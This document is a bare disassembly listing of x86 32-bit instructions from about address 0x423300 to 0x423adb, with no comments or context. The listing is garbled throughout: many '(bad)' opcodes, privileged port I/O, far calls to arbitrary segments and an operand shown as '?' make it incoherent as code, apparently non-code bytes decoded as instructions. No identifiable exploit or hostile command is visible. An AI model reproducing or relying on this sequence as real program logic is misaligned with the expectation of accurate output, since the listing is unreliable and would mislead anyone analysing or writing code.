  423300:	jo     0x4232a0
  423302:	or     eax,0x77996b1
  423307:	mov    edx,0xd97581e2
  42330c:	and    ah,BYTE PTR [edi-0x77]
  42330f:	jbe    0x4232d7
  423311:	sbb    ecx,DWORD PTR [edi-0x20]
  423314:	inc    ecx
  423315:	mov    ecx,0x71ecec8d
  42331a:	das    
  42331b:	call   0xe618:0xcd31a362
  423322:	ret    
  423323:	dec    ebx
  423324:	dec    dx
  423326:	adc    BYTE PTR [ecx-0x5e0e5c53],cl
  42332c:	int3   
  42332d:	push   0xffffff8a
  42332f:	rcr    al,0x6
  423332:	jge    0x423320
  423334:	daa    
  423335:	jmp    0x92ec2857
  42333a:	mov    al,0xed
  42333c:	clc    
  42333d:	scas   al,BYTE PTR es:[edi]
  42333e:	jmp    0x423379
  423340:	dec    ecx
  423341:	aaa    
  423342:	mov    BYTE PTR [edi],bh
  423344:	add    eax,0x539e5e0a
  423349:	inc    ebx
  42334a:	adc    BYTE PTR [ecx+0x71],bl
  42334d:	ret    0x491c
  423350:	pop    esp
  423351:	dec    ebx
  423352:	xchg   ebx,eax
  423353:	adc    BYTE PTR es:0x16b20d8,bl
  42335a:	or     eax,0x62baf58b
  42335f:	out    dx,al
  423360:	or     DWORD PTR [edx+0x5d],ebp
  423363:	mov    cl,0x3f
  423365:	shr    BYTE PTR [esi+0x2498c129],1
  42336b:	xlat   BYTE PTR ds:[ebx]
  42336c:	dec    ebx
  42336d:	sbb    dh,BYTE PTR [ebp-0x1addfb42]
  423373:	mov    ch,0x9c
  423375:	mov    eax,ds:0x961719fc
  42337a:	mov    edx,0x4aa680b5
  42337f:	popa   
  423380:	inc    eax
  423381:	fs rcr ecx,1
  423384:	xchg   edi,eax
  423385:	mov    BYTE PTR [eax-0x40],0x6
  423389:	aam    0x18
  42338b:	sub    dh,BYTE PTR [edx+0x22e9b586]
  423391:	cmp    BYTE PTR [esi+0x58],bl
  423394:	shl    DWORD PTR [ecx+0x19],cl
  423397:	bound  edx,QWORD PTR [edx+0x1b]
  42339a:	mov    DWORD PTR [esi+edi*4+0x7d],esi
  42339e:	mov    ds:0x7ccc6b02,al
  4233a3:	out    0x23,al
  4233a5:	xchg   BYTE PTR [ebx+0x76f25094],bl
  4233ab:	cmp    esi,eax
  4233ad:	pusha  
  4233ae:	sar    DWORD PTR ds:0x21e72e53,cl
  4233b4:	jmp    0x4233e5
  4233b6:	cmp    esp,DWORD PTR [esi+0x4]
  4233b9:	xchg   ebp,eax
  4233ba:	mov    ss,WORD PTR [edi+0x5e]
  4233bd:	sbb    BYTE PTR [edx],0xca
  4233c0:	sar    DWORD PTR [ebp-0x2fa2e09d],0x46
  4233c7:	shl    BYTE PTR ds:0x85e6636b,1
  4233cd:	add    eax,0x1a10d8dd
  4233d2:	out    dx,eax
  4233d3:	out    0x5c,eax
  4233d5:	sub    al,BYTE PTR ds:0x5ff9f9c6
  4233db:	aas    
  4233dc:	and    BYTE PTR [ebp-0x2cc5decd],al
  4233e2:	mov    ecx,0xad470c7c
  4233e7:	aam    0x9f
  4233e9:	pop    ds
  4233ea:	mov    bl,0x23
  4233ec:	dec    esi
  4233ed:	lahf   
  4233ee:	push   ebx
  4233ef:	popf   
  4233f0:	add    al,0xec
  4233f2:	shr    al,cl
  4233f4:	sub    dl,dh
  4233f6:	cs (bad) 
  4233f8:	out    0x8f,al
  4233fa:	lahf   
  4233fb:	xchg   ebp,edx
  4233fd:	cld    
  4233fe:	cwde   
  4233ff:	xchg   ecx,eax
  423400:	mov    bl,0x54
  423402:	or     esi,ecx
  423404:	dec    esi
  423405:	pop    edi
  423406:	(bad)  [ebx]
  423408:	push   cs
  423409:	or     dh,dl
  42340b:	or     BYTE PTR [edx+0x43],0xf7
  42340f:	cld    
  423410:	fwait
  423411:	sub    ebp,DWORD PTR [eax+0x1196a7b7]
  423417:	inc    eax
  423418:	les    edi,FWORD PTR [edx]
  42341a:	jp     0x4233f7
  42341c:	lods   eax,DWORD PTR ds:[esi]
  42341d:	mov    ch,0xfd
  42341f:	push   cs
  423420:	outs   dx,DWORD PTR ds:[esi]
  423421:	clc    
  423422:	fistp  DWORD PTR [esi+eiz*4]
  423425:	xor    ecx,ebp
  423427:	ror    BYTE PTR [ebx+0x53f294],1
  42342d:	retf   
  42342e:	jns    0x423432
  423430:	add    DWORD PTR [ebx+0x21],edi
  423433:	in     al,0x1c
  423435:	mov    WORD PTR [esi+ebp*8+0x4a310ef4],cs
  42343c:	movsx  eax,BYTE PTR ds:0x6899bcfe
  423443:	popa   
  423444:	mov    edx,DWORD PTR [edi*4+0x6bcc735f]
  42344b:	sbb    DWORD PTR [edi+eiz*1],0x46cb1894
  423452:	mov    edi,0xc92edb0f
  423457:	call   0x8850:0x9877bac1
  42345e:	push   edi
  42345f:	mov    ecx,0xbbf37aaa
  423464:	gs mov ebx,0x6b36665c
  42346a:	icebp  
  42346b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42346c:	lock ins DWORD PTR es:[edi],dx
  42346e:	ins    DWORD PTR es:[edi],dx
  42346f:	daa    
  423470:	out    dx,al
  423471:	setbe  BYTE PTR [edi-0x56]
  423475:	pop    ebp
  423476:	jns    0x4234ab
  423478:	sub    eax,0xb091f23d
  42347d:	jmp    0xe97551d6
  423482:	sbb    bh,BYTE PTR [ecx-0x70]
  423485:	and    eax,0xe228b5db
  42348a:	and    DWORD PTR [edx],edi
  42348c:	add    eax,0x1b06bc3
  423491:	jmp    0x1565:0x459ef17e
  423498:	sbb    eax,0x2143ea96
  42349d:	sbb    al,ch
  42349f:	add    DWORD PTR [edi+ebx*1-0x124076b8],0xec838e39
  4234aa:	into   
  4234ab:	mov    ds:0xf2d466cc,al
  4234b0:	imul   edx,edi,0x667d3d50
  4234b6:	lahf   
  4234b7:	mov    DWORD PTR [esi+ebp*2+0x3a824623],ebx
  4234be:	cld    
  4234bf:	dec    ebp
  4234c0:	lock cdq 
  4234c2:	jp     0x423511
  4234c4:	stos   BYTE PTR es:[edi],al
  4234c5:	inc    esi
  4234c6:	cmp    al,0x1d
  4234c8:	sbb    al,0xe8
  4234ca:	adc    al,0xd5
  4234cc:	jl     0x423538
  4234ce:	and    esp,DWORD PTR gs:[eax]
  4234d1:	ret    
  4234d2:	fs test al,0xb9
  4234d5:	sbb    esp,ebp
  4234d7:	loop   0x4234d6
  4234d9:	mov    ds:0xc05ca3e5,al
  4234de:	push   0xace17079
  4234e3:	or     bl,BYTE PTR [edi+0x2f5ce332]
  4234e9:	inc    ebx
  4234ea:	push   es
  4234eb:	imul   ebp,DWORD PTR [ecx],0x9eed67f9
  4234f1:	adc    al,0xff
  4234f3:	fcomp  QWORD PTR [edi-0x75]
  4234f6:	mov    DWORD PTR [edx-0x61],ebx
  4234f9:	sti    
  4234fa:	fstp   TBYTE PTR [ebp+0x338b32e4]
  423500:	in     eax,0x83
  423502:	(bad)  
  423503:	aas    
  423504:	out    dx,al
  423505:	repz sub eax,edx
  423508:	push   0x1600315d
  42350d:	shr    DWORD PTR [eax-0x46bfc868],cl
  423513:	int3   
  423514:	pop    eax
  423515:	imul   eax,DWORD PTR [ebx+0x23],0x64
  423519:	fld1   
  42351b:	aam    0xb3
  42351d:	pop    ds
  42351e:	cwde   
  42351f:	(bad)  
  423520:	jbe    0x4234c5
  423522:	ins    DWORD PTR es:[edi],dx
  423523:	test   DWORD PTR [ebx-0x1f04bd36],edi
  423529:	in     eax,dx
  42352a:	mov    ecx,0xe82b9f2e
  42352f:	push   cs
  423530:	xor    DWORD PTR [eax-0x66],ebp
  423533:	sbb    DWORD PTR [ecx-0x5e470cc5],eax
  423539:	in     al,0x31
  42353b:	sbb    eax,0xd846e3c8
  423540:	pop    ebx
  423541:	dec    edi
  423542:	sbb    DWORD PTR [esi+ecx*1-0x458454f2],edi
  423549:	fdivr  QWORD PTR [esi-0xf]
  42354c:	adc    ch,dh
  42354e:	nop
  42354f:	add    eax,0x1b48fb9e
  423554:	push   eax
  423555:	shl    BYTE PTR [eax-0x299e78e5],cl
  42355b:	inc    esi
  42355c:	(bad)  
  42355d:	retf   
  42355e:	inc    esi
  42355f:	mov    ah,0xdb
  423561:	mov    edi,DWORD PTR fs:[edx+edi*1]
  423565:	pop    ebx
  423566:	jge    0x42353d
  423568:	add    BYTE PTR [esp+edx*4],bh
  42356b:	sbb    DWORD PTR [edi+eiz*2-0x3fd4d1af],0x6d787b9c
  423576:	mov    esp,0xa355c4b4
  42357b:	inc    eax
  42357c:	pop    ebp
  42357d:	jp     0x42358f
  42357f:	inc    DWORD PTR [edi+edi*2]
  423582:	xchg   esi,eax
  423583:	into   
  423584:	add    ebx,eax
  423586:	inc    edx
  423587:	and    al,0xfb
  423589:	mov    ch,BYTE PTR [eax]
  42358b:	add    cl,BYTE PTR [ecx]
  42358d:	or     DWORD PTR [ecx],edi
  42358f:	stos   BYTE PTR es:[edi],al
  423590:	mov    dh,BYTE PTR [edx-0x5b]
  423593:	cld    
  423594:	ja     0x42355e
  423596:	mov    es,edi
  423598:	push   ss
  423599:	jmp    0x30d9:0xce22ce33
  4235a0:	xchg   ebx,eax
  4235a1:	loop   0x42355d
  4235a3:	lods   al,BYTE PTR ds:[esi]
  4235a4:	xor    eax,0xf33891ec
  4235a9:	inc    eax
  4235aa:	sti    
  4235ab:	inc    edi
  4235ac:	inc    ebp
  4235ad:	shl    BYTE PTR [ebp+0x1b18c188],cl
  4235b3:	arpl   WORD PTR [ecx+0x3],si
  4235b6:	aad    0xdf
  4235b8:	loope  0x4235db
  4235ba:	fwait
  4235bb:	add    DWORD PTR [edi],ecx
  4235bd:	pop    ebp
  4235be:	popa   
  4235bf:	retf   0x725
  4235c2:	mov    ah,0x1a
  4235c4:	jge    0x423561
  4235c6:	pushf  
  4235c7:	ret    0x4aed
  4235ca:	mov    ch,0xbd
  4235cc:	mov    ebp,0x558fcf7f
  4235d1:	pop    ss
  4235d2:	dec    esp
  4235d3:	jbe    0x423573
  4235d5:	imul   esp,edx,0x51011dda
  4235db:	fs gs mov dl,0xa2
  4235df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235e0:	mov    BYTE PTR [esi-0x10c03556],bh
  4235e6:	mov    edi,0xb5dda03e
  4235eb:	jns    0x4235b3
  4235ed:	xchg   DWORD PTR [ebx],esi
  4235ef:	jae    0x423625
  4235f1:	popf   
  4235f2:	repnz pop eax
  4235f4:	jns    0x4235dd
  4235f6:	mov    edx,0x7df92df9
  4235fb:	pop    ds
  4235fc:	loopne 0x4235e0
  4235fe:	out    dx,al
  4235ff:	mov    ss,WORD PTR [edx+0x238991cb]
  423605:	push   ebp
  423606:	inc    edi
  423607:	ret    0xe6a5
  42360a:	(bad)  
  42360b:	ficomp WORD PTR [eax+0x5b]
  42360e:	scas   al,BYTE PTR es:[edi]
  42360f:	push   ds
  423610:	jae    0x4235e2
  423612:	add    BYTE PTR [eax-0x5d72103],bh
  423618:	idiv   DWORD PTR [ecx+0x41]
  42361b:	or     bl,bl
  42361d:	sbb    al,0xfe
  42361f:	cmp    edx,esp
  423621:	fcomp  DWORD PTR [edx+0x2febd3ce]
  423627:	fimul  WORD PTR [eax]
  423629:	add    al,0x43
  42362b:	data16 jmp 0x42367c
  42362e:	and    cl,BYTE PTR [ebx-0x66edb2a0]
  423634:	or     BYTE PTR [ecx-0x66],cl
  423637:	mov    al,ds:0xf20fa171
  42363c:	mov    ?,WORD PTR [ebp+0x5c]
  42363f:	cdq    
  423640:	into   
  423641:	sbb    al,BYTE PTR [edi+0x43fcbbc]
  423647:	mul    bl
  423649:	jo     0x4236c9
  42364b:	mov    dh,0x4c
  42364d:	stc    
  42364e:	jmp    0x4236b2
  423650:	push   edi
  423651:	pop    ebp
  423652:	mov    bl,0x49
  423654:	ror    cl,0xa6
  423657:	loope  0x42367b
  423659:	cmp    ebp,edi
  42365b:	shr    DWORD PTR [ecx],cl
  42365d:	push   cs
  42365e:	jmp    0xfd227852
  423663:	jl     0x42361d
  423665:	xlat   BYTE PTR ds:[ebx]
  423666:	or     DWORD PTR [edx+0x46415788],ecx
  42366c:	mov    edi,0xa2564f61
  423671:	aad    0x11
  423673:	push   edx
  423674:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423675:	cdq    
  423676:	or     bh,ch
  423678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423679:	fcomp  QWORD PTR [esi]
  42367b:	mov    dl,BYTE PTR [edx]
  42367d:	xor    al,0x55
  42367f:	mov    ah,0x92
  423681:	inc    ecx
  423682:	adc    esp,DWORD PTR [eax-0x3f]
  423685:	enter  0x8948,0xbd
  423689:	sti    
  42368a:	outs   dx,DWORD PTR ds:[esi]
  42368b:	sub    al,0x61
  42368d:	aad    0xee
  42368f:	test   eax,0x7e068b72
  423694:	cmp    DWORD PTR [ebx+0x6d8e6283],ebp
  42369a:	push   edx
  42369b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42369c:	mov    dh,0x8
  42369e:	lods   al,BYTE PTR ds:[esi]
  42369f:	or     DWORD PTR [eax],ebp
  4236a1:	sbb    edx,DWORD PTR [ecx-0x25ec4fcd]
  4236a7:	dec    eax
  4236a8:	cmp    bh,dl
  4236aa:	test   al,0xce
  4236ac:	inc    ecx
  4236ad:	xlat   BYTE PTR ds:[ebx]
  4236ae:	or     BYTE PTR [esi-0x153bcf21],ah
  4236b4:	xchg   esp,eax
  4236b5:	xchg   ebp,eax
  4236b6:	call   0x3434888d
  4236bb:	sbb    bl,BYTE PTR [eax-0x7c]
  4236be:	icebp  
  4236bf:	mul    DWORD PTR [edx+ebx*2+0x69a00cfa]
  4236c6:	xor    BYTE PTR [ebx+0x44],ah
  4236c9:	pushf  
  4236ca:	sub    ecx,DWORD PTR [ecx-0x2e]
  4236cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236ce:	sbb    al,0xc9
  4236d0:	scas   al,BYTE PTR es:[edi]
  4236d1:	in     al,0xd4
  4236d3:	add    BYTE PTR [eax+0x19],bl
  4236d6:	sti    
  4236d7:	add    al,0x1a
  4236d9:	sub    al,0x21
  4236db:	dec    edx
  4236dc:	jge    0x42367f
  4236de:	sub    DWORD PTR [ecx+0x3a],ebp
  4236e1:	test   BYTE PTR [ecx-0x72],cl
  4236e4:	cli    
  4236e5:	aas    
  4236e6:	mov    bh,BYTE PTR [ecx+0x2f]
  4236e9:	leave  
  4236ea:	mov    bh,al
  4236ec:	jg     0x4236e5
  4236ee:	test   DWORD PTR [ecx+0x2300ed19],ebp
  4236f4:	and    BYTE PTR [edi],al
  4236f6:	adc    eax,0x146ae51c
  4236fb:	int3   
  4236fc:	repz enter 0xc477,0x23
  423701:	out    0xb0,al
  423703:	xor    al,0x35
  423705:	sub    al,0x6a
  423707:	mov    ds:0x43ad61f1,eax
  42370c:	in     al,dx
  42370d:	shr    BYTE PTR [edx-0x1c96f5c2],0xcc
  423714:	pop    esp
  423715:	retf   0x1339
  423718:	and    eax,0x5efbed1f
  42371d:	out    dx,eax
  42371e:	mov    BYTE PTR [edi],0xad
  423721:	add    al,0x42
  423723:	imul   ebp,DWORD PTR cs:[ecx+0x35618008],0x6
  42372b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42372c:	retf   0x2c60
  42372f:	add    BYTE PTR [eax+ecx*1],dl
  423732:	pop    ebp
  423733:	icebp  
  423734:	add    eax,0xe32a450f
  423739:	addr16 mov esi,0x2a10d1ca
  42373f:	mov    al,0x4c
  423741:	stc    
  423742:	fisttp WORD PTR [esi]
  423744:	cmc    
  423745:	mov    ds:0x760fb53c,al
  42374a:	adc    dl,BYTE PTR [esp+eiz*2-0x2b]
  42374e:	and    BYTE PTR [esi+0x503f456],0x4c
  423755:	add    edi,DWORD PTR [ecx-0x10]
  423758:	in     eax,0x6a
  42375a:	mov    eax,0xbb1336b0
  42375f:	push   cs
  423760:	in     eax,dx
  423761:	push   ds
  423762:	xor    eax,0x6f8f2136
  423767:	jnp    0x42370d
  423769:	outs   dx,DWORD PTR ds:[esi]
  42376a:	mov    bh,0x59
  42376c:	js     0x4237e2
  42376e:	mov    ebp,DWORD PTR [ecx-0x5287f3a9]
  423774:	cs pop ecx
  423776:	(bad)  
  423777:	lods   al,BYTE PTR ds:[esi]
  423778:	fist   WORD PTR [ebp-0x293c54d1]
  42377e:	jmp    0x2801:0x54c3d02c
  423785:	adc    eax,0x1e147fe8
  42378a:	xor    al,0x4a
  42378c:	call   0xd389a014
  423791:	xchg   edi,eax
  423792:	lahf   
  423793:	pop    ebx
  423794:	mov    bh,0x5d
  423796:	mov    edi,0x4b23dbc5
  42379b:	gs cmp eax,0x385dcb53
  4237a1:	inc    esp
  4237a2:	sbb    ebx,ebx
  4237a4:	mov    cl,0xd2
  4237a6:	imul   ebx,DWORD PTR [esi+0x3acaad6],0xffffffc2
  4237ad:	jp     0x423825
  4237af:	out    dx,al
  4237b0:	inc    edi
  4237b1:	sbb    esp,DWORD PTR [edi+0x54]
  4237b4:	bound  esp,QWORD PTR ds:0x2fcdf112
  4237ba:	lea    ebx,[ecx+ebp*4+0x48]
  4237be:	mov    dh,0x49
  4237c0:	sbb    eax,edx
  4237c2:	inc    ebp
  4237c3:	aas    
  4237c4:	loop   0x42380a
  4237c6:	adc    DWORD PTR [ecx-0x2b],ecx
  4237c9:	sub    al,0x7f
  4237cb:	jge    0x4237b9
  4237cd:	into   
  4237ce:	scas   al,BYTE PTR es:[edi]
  4237cf:	jle    0x42375d
  4237d1:	mov    dh,0x23
  4237d3:	retf   
  4237d4:	and    BYTE PTR [eax-0x9],ch
  4237d7:	(bad)  
  4237d8:	jmp    0x42378f
  4237da:	outs   dx,BYTE PTR ds:[esi]
  4237db:	mov    al,ds:0x1be70413
  4237e0:	adc    BYTE PTR [esi+0xc],ch
  4237e3:	ins    DWORD PTR es:[edi],dx
  4237e4:	les    esi,FWORD PTR [ebp-0x45c8fdc5]
  4237ea:	das    
  4237eb:	out    dx,eax
  4237ec:	loop   0x4237ba
  4237ee:	push   ecx
  4237ef:	aas    
  4237f0:	adc    cl,BYTE PTR [edi+0x3441297b]
  4237f6:	rcr    BYTE PTR [esi],cl
  4237f8:	data16 (bad) 
  4237fa:	dec    ebx
  4237fb:	dec    edi
  4237fc:	push   ecx
  4237fd:	test   eax,0xa865fb92
  423802:	pop    esi
  423803:	xor    DWORD PTR [edx],esi
  423805:	push   es
  423806:	int    0xe2
  423808:	icebp  
  423809:	leave  
  42380a:	jbe    0x4237a4
  42380c:	pop    ebx
  42380d:	push   esp
  42380e:	ja     0x423885
  423810:	daa    
  423811:	out    0xc5,eax
  423813:	cli    
  423814:	scas   eax,DWORD PTR es:[edi]
  423815:	cmp    BYTE PTR [ecx+eiz*1+0x3f78fee8],0xde
  42381d:	ror    DWORD PTR [edi-0x16],1
  423820:	cmc    
  423821:	leave  
  423822:	mov    esi,0x22965c06
  423827:	popf   
  423828:	xor    eax,0xc95ca04f
  42382d:	outs   dx,BYTE PTR ds:[esi]
  42382e:	mov    eax,ds:0xea4a8982
  423833:	push   ecx
  423834:	and    al,0x84
  423836:	mov    esp,0x27ff8626
  42383b:	xchg   edi,eax
  42383c:	fidivr WORD PTR [ebp-0xdb1672d]
  423842:	clc    
  423843:	ins    BYTE PTR es:[edi],dx
  423844:	fcom   DWORD PTR [ebp+esi*4-0x79]
  423848:	pop    ss
  423849:	xor    BYTE PTR [esi+0x7db02ab8],bh
  42384f:	shr    BYTE PTR [edi-0x12],cl
  423852:	jo     0x4238cc
  423854:	je     0x423831
  423856:	pop    es
  423857:	inc    edi
  423858:	adc    esi,DWORD PTR [ebp+ecx*2-0xec788ff]
  42385f:	inc    esi
  423860:	shl    BYTE PTR [ebp+0x4410fcaa],0x74
  423867:	sbb    ecx,DWORD PTR [esp+ebx*8+0x11]
  42386b:	fld    DWORD PTR [eax+eax*1+0x4a]
  42386f:	retf   0x5c75
  423872:	aam    0xfb
  423874:	stc    
  423875:	aam    0xd7
  423877:	jg     0x42385f
  423879:	lods   al,BYTE PTR ds:[esi]
  42387a:	loope  0x4238aa
  42387c:	ror    BYTE PTR [ecx],1
  42387e:	(bad)  
  42387f:	stos   DWORD PTR es:[edi],eax
  423880:	retf   
  423881:	pop    esp
  423882:	aaa    
  423883:	in     eax,dx
  423884:	adc    edx,DWORD PTR ds:0x2da6e9ac
  42388a:	add    al,0xc1
  42388c:	push   es
  42388d:	loop   0x42385b
  42388f:	or     esi,esp
  423891:	int3   
  423892:	loope  0x423908
  423894:	xchg   esi,eax
  423895:	or     esi,DWORD PTR ds:0xee3389b4
  42389b:	les    edx,FWORD PTR [ecx+esi*1-0x46]
  42389f:	dec    esp
  4238a0:	bound  eax,QWORD PTR [bx+si-0x62b]
  4238a5:	fstp   QWORD PTR [edx]
  4238a7:	jecxz  0x4238b9
  4238a9:	ds dec edi
  4238ab:	pop    edi
  4238ac:	mov    DWORD PTR [eax-0x77],esp
  4238af:	fsub   DWORD PTR [ebx]
  4238b1:	cmp    ah,ah
  4238b3:	add    BYTE PTR [ebx+0x76b34f91],0x8a
  4238ba:	fmul   QWORD PTR [ebx+0x78]
  4238bd:	and    BYTE PTR [esi-0x23706150],0xc3
  4238c4:	dec    ebx
  4238c5:	mov    eax,ds:0x6bff44c3
  4238ca:	data16 sti 
  4238cc:	(bad)  
  4238cd:	adc    BYTE PTR [eax-0x322497b5],dh
  4238d3:	sbb    DWORD PTR [esi+0x6471477d],edx
  4238d9:	xor    edi,esp
  4238db:	dec    ebp
  4238dc:	xlat   BYTE PTR ds:[ebx]
  4238dd:	aam    0x69
  4238df:	mov    eax,ds
  4238e1:	mov    dh,0x43
  4238e3:	jmp    0x9d7e0b58
  4238e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238e9:	pop    ebx
  4238ea:	cbw    
  4238ec:	adc    al,0xaa
  4238ee:	sub    ch,dl
  4238f0:	rcr    edx,0x8c
  4238f3:	fisubr WORD PTR [edi-0x4f]
  4238f6:	out    0xb4,eax
  4238f8:	jbe    0x42388e
  4238fa:	pop    ds
  4238fb:	out    0xa3,al
  4238fd:	popf   
  4238fe:	stos   DWORD PTR es:[edi],eax
  4238ff:	push   esi
  423900:	pop    ecx
  423901:	inc    ecx
  423902:	rcr    BYTE PTR [eax+ecx*8],cl
  423905:	jmp    0x5f2a2790
  42390a:	mov    cl,0x32
  42390c:	out    0x39,eax
  42390e:	and    BYTE PTR [edi-0x5c],0x29
  423912:	push   esp
  423913:	jbe    0x4238b3
  423915:	xchg   ebx,eax
  423916:	add    eax,ecx
  423918:	mov    DWORD PTR [edx],0x4842aa46
  42391e:	inc    esp
  42391f:	sti    
  423920:	mov    al,0x2f
  423922:	bound  ecx,QWORD PTR [eax]
  423924:	inc    eax
  423925:	test   BYTE PTR [edi],0x3f
  423928:	pop    ecx
  423929:	or     BYTE PTR [esp+ecx*4],ah
  42392c:	call   0xa129:0x77932d9f
  423933:	cmc    
  423934:	shl    ah,cl
  423936:	push   ss
  423937:	nop
  423938:	and    BYTE PTR [eax+ebp*4],0x5a
  42393c:	stos   DWORD PTR es:[edi],eax
  42393d:	mov    cs,WORD PTR [edi]
  42393f:	lods   al,BYTE PTR ds:[esi]
  423940:	cmp    DWORD PTR [edi-0x67c08645],ecx
  423946:	out    dx,al
  423947:	pop    ds
  423948:	sahf   
  423949:	xor    eax,0x44915172
  42394e:	xor    eax,0xa28caf16
  423953:	call   0x6788f720
  423958:	clc    
  423959:	lahf   
  42395a:	inc    edx
  42395b:	xchg   ebx,eax
  42395c:	mov    ebp,0x79756f6e
  423961:	outs   dx,DWORD PTR ds:[esi]
  423962:	cs pop eax
  423964:	ds jecxz 0x42391b
  423967:	mov    dl,0x83
  423969:	call   0xb63:0x569cd35e
  423970:	rcr    edx,0x5c
  423973:	inc    edx
  423974:	mov    esp,0x965dea9b
  423979:	or     ecx,DWORD PTR [edi-0x10]
  42397c:	test   al,0x32
  42397e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42397f:	nop
  423980:	pop    edi
  423981:	mov    edx,0x16ec3450
  423986:	or     ebp,DWORD PTR ss:[eax+0x2b]
  42398a:	push   es
  42398b:	adc    al,0x2e
  42398d:	iret   
  42398e:	push   ds
  42398f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423990:	lahf   
  423991:	inc    eax
  423992:	pusha  
  423993:	and    ebp,eax
  423995:	xor    BYTE PTR [ebp-0x79],0x23
  423999:	dec    ebp
  42399a:	dec    esp
  42399b:	mov    esp,ebx
  42399d:	sub    eax,DWORD PTR [ecx+ebp*4-0x2cb14eb8]
  4239a4:	dec    eax
  4239a5:	mov    esp,0xd2784961
  4239aa:	scas   al,BYTE PTR es:[edi]
  4239ab:	mov    edx,0xfa018a28
  4239b0:	outs   dx,BYTE PTR ds:[esi]
  4239b1:	retf   0x47f
  4239b4:	enter  0xe262,0x3f
  4239b8:	xlat   BYTE PTR ds:[ebx]
  4239b9:	or     eax,0xbafb3db0
  4239be:	jb     0x4239de
  4239c0:	loope  0x423a41
  4239c2:	lahf   
  4239c3:	xor    cl,BYTE PTR [edx+0x6a61260]
  4239c9:	dec    ecx
  4239ca:	sahf   
  4239cb:	hlt    
  4239cc:	inc    edx
  4239cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239cf:	push   ecx
  4239d0:	addr16 jl 0x423972
  4239d3:	xor    al,0x56
  4239d5:	inc    edx
  4239d6:	mov    cl,0x8b
  4239d8:	daa    
  4239d9:	add    ah,BYTE PTR [ebx+0x28]
  4239dc:	in     al,dx
  4239dd:	fistp  QWORD PTR [esi+esi*4]
  4239e0:	cmp    al,0xe8
  4239e2:	xchg   ebx,eax
  4239e3:	ss out 0xcf,al
  4239e6:	neg    BYTE PTR [ebx]
  4239e8:	jl     0x4239d0
  4239ea:	jle    0x4239b7
  4239ec:	cwde   
  4239ed:	push   0x28
  4239ef:	repz mov al,ds:0xee7ec94
  4239f5:	(bad)  
  4239f6:	(bad)  
  4239f8:	add    BYTE PTR [edi-0x4b],0xad
  4239fc:	fs or  al,0x92
  4239ff:	out    dx,eax
  423a00:	and    dl,BYTE PTR [ecx]
  423a02:	jno    0x4239b3
  423a04:	addr16 mov eax,ds:0x1fe
  423a08:	or     ch,BYTE PTR [ebx-0x2358f68e]
  423a0e:	pop    esi
  423a0f:	cmp    cl,dh
  423a11:	inc    edi
  423a12:	or     ah,dl
  423a14:	pop    edx
  423a15:	sub    dh,ch
  423a17:	jb     0x423a5e
  423a19:	jg     0x423a87
  423a1b:	add    al,0xef
  423a1d:	scas   eax,DWORD PTR es:[edi]
  423a1e:	in     eax,dx
  423a1f:	mov    esi,ds
  423a21:	xor    ch,ah
  423a23:	cmp    eax,0x17123761
  423a28:	ss mov ebp,0x6541e1c4
  423a2e:	and    esp,ebx
  423a30:	jmp    0x7601:0xf9ea36d0
  423a37:	lea    ebp,[ebp-0x3f]
  423a3a:	mov    BYTE PTR [ebx+0x72],bl
  423a3d:	fs mov cl,0x7c
  423a40:	lods   al,BYTE PTR ds:[esi]
  423a41:	adc    edx,edi
  423a43:	cmp    eax,0x62c1bb0a
  423a48:	in     eax,0xf0
  423a4a:	pop    ebp
  423a4b:	jecxz  0x423a30
  423a4d:	sti    
  423a4e:	aad    0xa4
  423a50:	(bad)  
  423a53:	inc    edi
  423a54:	pop    eax
  423a55:	mov    ecx,0x6ec99431
  423a5a:	inc    edi
  423a5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a5c:	lea    esi,[eax]
  423a5e:	call   0xe880:0xbeede76a
  423a65:	push   edx
  423a66:	cmp    al,al
  423a68:	mov    ds:0x723589f8,eax
  423a6d:	jbe    0x423a8e
  423a6f:	imul   ecx,esp,0xa
  423a72:	(bad)  
  423a73:	icebp  
  423a74:	jne    0x423a18
  423a76:	pusha  
  423a77:	shl    bl,cl
  423a79:	lahf   
  423a7a:	scas   al,BYTE PTR es:[edi]
  423a7b:	fldcw  WORD PTR [ebx+0x2d]
  423a7e:	jecxz  0x423abe
  423a80:	es mov eax,0x8ce2d691
  423a86:	(bad)  
  423a87:	pop    esi
  423a88:	in     al,0x35
  423a8a:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  423a8c:	push   ebx
  423a8d:	inc    esi
  423a8e:	(bad)  
  423a8f:	xchg   edi,eax
  423a90:	cs into 
  423a92:	and    al,0xab
  423a94:	sti    
  423a95:	and    DWORD PTR [ecx-0x339fe03c],esi
  423a9b:	cli    
  423a9c:	(bad)
  423a9f:	adc    al,0x5b
  423aa1:	xor    dl,ah
  423aa3:	adc    BYTE PTR [ecx],cl
  423aa5:	jb     0x423ab2
  423aa7:	add    BYTE PTR [eax+0x37],bh
  423aaa:	inc    esp
  423aab:	mov    al,ds:0x74af2933
  423ab0:	jl     0x423a3e
  423ab2:	xlat   BYTE PTR ds:[ebx]
  423ab3:	sub    BYTE PTR [ebx],0xc7
  423ab6:	sub    BYTE PTR [edi],al
  423ab8:	push   edi
  423ab9:	cmp    al,0x35
  423abb:	mov    ds:0xcb70dfd1,al
  423ac0:	je     0x423b3f
  423ac2:	adc    al,0xaf
  423ac4:	nop
  423ac5:	push   es
  423ac6:	bound  ecx,QWORD PTR [esi-0x6d]
  423ac9:	pop    ds
  423aca:	add    BYTE PTR [edx-0x7],dl
  423acd:	sub    al,BYTE PTR [ecx]
  423acf:	jne    0x423afc
  423ad1:	or     DWORD PTR [eax+0x6d],ebp
  423ad4:	retf   
  423ad5:	sbb    al,0x1d
  423ad7:	xchg   ebp,esp
  423ad9:	cld    
  423ada:	push   ecx
  423adb:	or     cl,BYTE PTR [eax-0x1371c20c]
